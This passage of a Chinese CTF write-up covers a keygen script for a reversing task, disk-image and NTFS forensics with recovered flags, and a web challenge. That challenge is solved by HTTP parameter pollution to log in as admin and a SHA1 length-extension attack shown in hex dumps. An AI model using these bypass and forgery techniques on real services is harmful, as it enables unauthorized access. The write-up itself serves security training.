    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    <span class="literal">d2</span> = f.read()[<span class="number">0x18f0</span>:]
    f.close()
    for k in range(<span class="number">16</span>):
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;gt<span class="comment">;&amp;gt; 4])</span>
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;amp<span class="comment">; 0xf])</span>
    <span class="label">#print</span> v26
    v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for i in range(<span class="number">16</span>):
        v42 <span class="label">=v42</span> + <span class="keyword">str(ord(v26[i]))
</span>    temp = v42.split(&amp;apos<span class="comment">;0&amp;apos;)</span>
    final_v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for t in temp:
        final_v42 += t
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    for m in range(<span class="number">5</span>,<span class="number">13</span>):
        <span class="preprocessor">if</span> final_v42[m] != <span class="literal">v8</span>[m-<span class="number">5</span>]:
            result<span class="number">=0</span>
            return <span class="number">0</span>
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    <span class="literal">v8</span> = final_v42[<span class="number">5</span>:<span class="number">13</span>]
    <span class="literal">a2</span> = <span class="literal">a1</span>[<span class="number">0</span>:<span class="number">15</span>]+<span class="literal">v8</span>[<span class="number">0</span>]+<span class="literal">a1</span>[<span class="number">16</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">12</span>]+<span class="literal">v8</span>[<span class="number">1</span>]+<span class="literal">a2</span>[<span class="number">13</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">18</span>]+<span class="literal">v8</span>[<span class="number">2</span>]+<span class="literal">a2</span>[<span class="number">19</span>:]
    <span class="literal">a2</span> = <span class="literal">v8</span>[<span class="number">3</span>]+<span class="literal">a2</span>[<span class="number">1</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">6</span>]+<span class="literal">v8</span>[<span class="number">4</span>]+<span class="literal">a2</span>[<span class="number">7</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">8</span>]+<span class="literal">v8</span>[<span class="number">5</span>]+<span class="literal">a2</span>[<span class="number">9</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">5</span>]+<span class="literal">v8</span>[<span class="number">6</span>]+<span class="literal">a2</span>[<span class="number">6</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">3</span>]+<span class="literal">v8</span>[<span class="number">7</span>]+<span class="literal">a2</span>[<span class="number">4</span>:]
    return <span class="literal">a2</span>
<span class="label">a1</span> = &amp;apos<span class="comment">;aaaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;abaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;acaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;adaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aeaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;afaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;agaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ahaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aiaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ajaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
</code></pre><h4 id="Broken">Broken</h4><p>&#x4EC0;&#x4E48;&#x90FD;&#x662F;&#x574F;&#x7684;&#xFF0C;&#x627E;&#x4E86;&#x4E2A;&#x6B63;&#x5E38;&#x7684;&#x5F15;&#x5BFC;&#x533A;&#x76F4;&#x63A5;winhex&#x8986;&#x76D6;&#x5934;&#xFF0C;&#x53D1;&#x73B0;&#x542F;&#x52A8;&#x4E0D;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;vmware&#x5728;windows&#x4E0B;&#x6302;&#x8F7D;&#x8F6F;&#x76D8;&#x955C;&#x50CF;&#x6216;&#x8005;&#x76F4;&#x63A5;winhex&#x6253;&#x5F00;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/J3mumaF.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/eMnIjq.jpg" alt=""></p>
<p>Flag&#x6587;&#x4EF6;&#x62FF;&#x4E0B;&#x6765;&#xFF0C;&#x8865;&#x4E0A;png&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/Q3iaAjy.jpg" alt=""></p>
<p><img src="http://img0.tuicool.com/2EVBvmJ.jpg" alt=""></p>
<p>&#x5F00;&#x8111;&#x6D1E;&#xFF0C;&#x8C03;&#x5927;&#x957F;&#x5EA6;&#xFF0C;&#x62FF;&#x5230;flag&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/3eyAJvn.jpg" alt=""></p>
<h4 id="NESTING_DOLL">NESTING DOLL</h4><p><a href="https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002" target="_blank" rel="external">https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002</a>;</p>
<h4 id="Repartition:">Repartition:</h4><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;</p>
<p><img src="http://img0.tuicool.com/Efy26n.jpg" alt=""></p>
<p>Secret.rar&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x7528;&#x666E;&#x901A;&#x7684;&#x6570;&#x636E;&#x6062;&#x590D;&#x8F6F;&#x4EF6;&#x5373;&#x53EF;&#x8FD8;&#x539F;&#x3002;</p>
<p>&#x4F46;&#x662F;secretpass.txt&#x88AB;&#x5927;&#x6587;&#x4EF6;&#x8986;&#x76D6;&#x4E86;</p>
<p>&#x627E;&#x5230;&#x5176;ntfs&#x7236;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x8BB0;&#x5F55;0x80b1800&#xFF0C;&#x5728;&#x4E0B;&#x65B9;&#x504F;&#x79FB;0&#xD7;200&#x51FA;&#x53D1;&#x73B0;secret.rar&#x7684;&#x5BC6;&#x7801;</p>
<p><img src="http://img2.tuicool.com/I7ry6zE.jpg" alt=""></p>
<p>&#x89E3;&#x538B;&#x5F97;&#x5230;flag{ch0n9x1n_f3n9u-fu_g41_yebu4nquan}</p>
<h4 id="Salt">Salt</h4><p>&#x672C;&#x9898;&#x5173;&#x952E;&#x70B9;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x7528;&#x6237;&#x540D;admin&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F;sha1&#x7684;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x7B2C;&#x4E00;&#x70B9;&#x7ED5;&#x8FC7;&#x7684;&#x5173;&#x952E;&#x70B9;&#x662F;url&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x4F1A;&#x8986;&#x76D6;&#x524D;&#x9762;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x6784;&#x9020;</p>
<pre><code>/login?<span class="variable">username=</span>a&amp;amp;<span class="variable">password=</span>aaaaaa&amp;amp;<span class="variable">username=</span>admin
</code></pre><p>&#x5373;&#x53EF;&#xFF0C;&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;password&#x5FC5;&#x987B;&#x4E3A;6-20&#x4F4D;&#xFF0C;&#x8FD9;&#x91CC;&#x53D6;6&#x4F4D;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x7B2C;&#x4E8C;&#x70B9;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x8FD9;&#x91CC;&#x89E3;&#x91CA;&#x4E00;&#x4E0B;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9700;&#x8981;&#x54C8;&#x5E0C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x5728;sha1&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5148;&#x8865;&#x4E00;&#x4E2A;&#x6BD4;&#x7279;&#x7684;1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;0&#xD7;80&#xFF0C;&#x7136;&#x540E;&#x8865;&#x9F50;&#x81F3;&#x4F59;512&#x4E3A;418&#xFF0C;&#x4E5F;&#x5C31;&#x662F;52&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5269;&#x4F59;&#x7684;12&#x4E2A;&#x5B57;&#x8282;&#x7528;&#x6765;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF0C;&#x5373;*&#xFF08;&#x6CE8;&#xFF1A;&#x8865;&#x9F50;&#xFF0C;&#x4F59;512&#x4E3A;448&#xFF0C;&#x6700;&#x540E;&#x516B;&#x5B57;&#x8282;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF09;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
</code></pre><p>&#x7136;&#x540E;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4F5C;&#x4E3A;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#xFF0C;</p>
<pre><code><span class="setting">h0=<span class="value"><span class="number">0</span>x67452301,</span></span>
<span class="setting">h1=<span class="value"><span class="number">0</span>xEFCDAB89,</span></span>
<span class="setting">h2=<span class="value"><span class="number">0</span>x98BADCFE,</span></span>
<span class="setting">h3=<span class="value"><span class="number">0</span>x10325476,</span></span>
<span class="setting">h4=<span class="value"><span class="number">0</span>xC3D2E1F0</span></span>
</code></pre><p>&#x8BA1;&#x7B97;&#x7684;&#x89C4;&#x5219;&#x662F;&#x5BF9;&#x8865;&#x9F50;&#x540E;&#x7684;&#x6570;&#x636E;&#x4EE5;512bit&#x5373;64&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x7EC4;&#x8FDB;&#x884C;&#x79FB;&#x4F4D;&#x5F02;&#x6216;&#x7B49;&#x6570;&#x5B66;&#x8BA1;&#x7B97;&#xFF0C;&#x6BCF;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x4F1A;&#x6539;&#x53D8;h1-h4&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x4E9B;&#x6539;&#x53D8;&#x7684;&#x503C;&#x5C06;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x3002;&#x5168;&#x90E8;&#x7EC4;&#x8BA1;&#x7B97;&#x5B8C;&#x6210;&#x540E;&#x6700;&#x7EC8;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x5C31;&#x662F;sha1&#x7684;&#x503C;&#x3002;</p>
<p>&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x653B;&#x51FB;&#x601D;&#x8DEF;&#xFF0C;&#x9996;&#x5148;&#x53D1;&#x9001;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x83B7;&#x53D6;sha1&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x8865;&#x9F50;&#x4E0A;&#x4E00;&#x7EC4;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53C8;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;sha1&#xFF0C;&#x4E4B;&#x540E;&#x5BF9;&#x7B2C;&#x4E00;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x63D0;&#x53D6;&#xFF0C;&#x4FEE;&#x6539;&#x7B97;&#x6CD5;&#x4E2D;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x7B97;&#x6CD5;&#x4EC5;&#x4EC5;&#x7528;&#x4E8E;&#x5BF9;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x7684;&#x8865;&#x5168;&#x6570;&#x636E;&#x8FDB;&#x884C;sha1&#xFF0C;&#x5C31;&#x80FD;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x3002;</p>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F   <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span>   <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x8FD9;&#x7EC4;&#x6570;&#x636E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;a02d54c05cecc94ff2d698146e0b2c778104d85&#xFF0C;&#x83B7;&#x53D6;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x5206;&#x522B;&#x4E3A;0xa02d54c0&#xFF0C;0x5cecc94f&#xFF0C;0xf2d69814&#xFF0C;0x6e0b2c77&#xFF0C;0x8104d85</p>
<p>&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
</code></pre><p>&#x8BE5;&#x7EC4;&#x5728;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x8865;&#x5168;&#x7684;&#x7ED3;&#x679C;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
<span class="number">00000080</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000090</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000A0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000B0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 04 00</span>  ................
</code></pre><p>&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x5C06;&#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF;0xa02d54c0,0x5cecc94f0x,f2d69814,0x6e0b2c77,0x8104d85&#x5E26;&#x5165;&#x7B97;&#x6CD5;&#xFF0C;&#x53EA;&#x9700;&#x8BA1;&#x7B97;&#x8865;&#x4E0A;&#x7684;&#x4FE1;&#x606F;</p>
<pre><code><span class="number">00000080</span>: <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">00000090</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>A0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>B0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.</span>
</code></pre><p>&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x76F8;&#x7B49;&#x7684;sha1&#xFF0C;&#x5373;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x672C;&#x9898;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E0D;&#x5168;&#xFF0C;&#x53EA;&#x9700;&#x5BF9;&#x7B2C;&#x4E00;&#x6B21;&#x83B7;&#x53D6;&#x7684;sha1&#x4E2D;&#x7684;x&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x6B21;&#x7684;sha1&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x3002;</p>
<h4 id="&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;">&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;</h4><pre><code>&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7801</span>;
<span class="class">Sha1</span>.h
//! <span class="class">SHA1</span> &amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x5B9E</span>;&amp;<span class="symbol">#x73B0</span>;   <span class="class">H</span>&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x4EF6</span>;
<span class="symbol">#ifndef</span> <span class="class">SHA1_H</span>
<span class="symbol">#define</span> <span class="class">SHA1_H</span>

<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
//! #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;<span class="class">SHA</span> &amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;<span class="class">ENUM</span>
/*&amp;<span class="symbol">#xFF01</span>;
     @see enum
*/
<span class="symbol">#ifndef</span> _SHA_enum_
<span class="symbol">#define</span> _SHA_enum_
enum
{
         shaSuccess   = <span class="number">0</span>,
         /*!   &amp;lt;&amp;<span class="symbol">#x7A7A</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x793A</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>; */
         shaNull,           
         /*!   &amp;lt; &amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x592A</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x63D0</span>;&amp;<span class="symbol">#x793A</span>; */
         shaInputTooLong,
